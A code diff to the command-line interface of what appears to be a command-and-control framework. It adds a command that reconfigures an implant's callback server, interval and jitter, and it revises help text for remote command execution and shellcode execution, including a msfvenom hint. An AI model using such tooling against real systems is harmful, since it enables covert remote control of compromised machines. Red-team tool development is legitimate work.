@@ -128,6 +128,31 @@ var interactCliApp cli.App = cli.App{
 			Action:      interactKill,
 		},
 		{
+			Name:        "config",
+			Usage:       "change configuration of this implant",
+			UsageText:   "config [--server-ip?] [--server-port?] [--callback-interval?] [--callback-jitter?]",
+			Description: "This command allows you to change the configuration of an implant. Options can be left empty if you don't want their values to change.",
+			Flags: []cli.Flag{
+				&cli.StringFlag{
+					Name:  "server-ip",
+					Usage: "ip-addres that the implant will contact for next iterations. DANGEROUS: you might lose the implant if you put in the wrong ip-addres.",
+				},
+				&cli.StringFlag{
+					Name:  "server-port",
+					Usage: "port that the implant will contact for next iterations.",
+				},
+				&cli.StringFlag{
+					Name:  "callback-interval",
+					Usage: "the interval (in seconds) that the implant will wait before sending a next check-in.",
+				},
+				&cli.StringFlag{
+					Name:  "callback-jitter",
+					Usage: "the jitter (in seconds) that callback intervals will vary.",
+				},
+			},
+			Action: interactConfig,
+		},
+		{
 			Name:        "exit",
 			Usage:       "Stop interacting with this implant",
 			UsageText:   "exit",
@@ -197,7 +222,7 @@ var interactCliApp cli.App = cli.App{
 		{
 			Name:        "exec",
 			Usage:       "execute a command",
-			UsageText:   "exec [--cmd] [--args]",
+			UsageText:   "exec [--cmd] [--args?]",
 			Description: "executes a command on the remote implant. This command is implemented using the \"os/exec\" package, see the docs for more information about the required parameters.",
 			Category:    "Modules",
 			Flags: []cli.Flag{
@@ -216,7 +241,7 @@ var interactCliApp cli.App = cli.App{
 			Name:        "shellcode-exec",
 			Usage:       "execute shellcode on remote implant",
 			UsageText:   "shellcode-exec [shellcode]",
-			Description: "executes shellcode on the remote implant. the shellcode should be in base64 format.",
+			Description: "executes shellcode on the remote implant. the shellcode should be in hex string format. E.g. in msfvenom, use \"-f hex\" to get the correct output",
 			Category:    "Modules",
 			Action:      interactShellcodeExec,
 		},
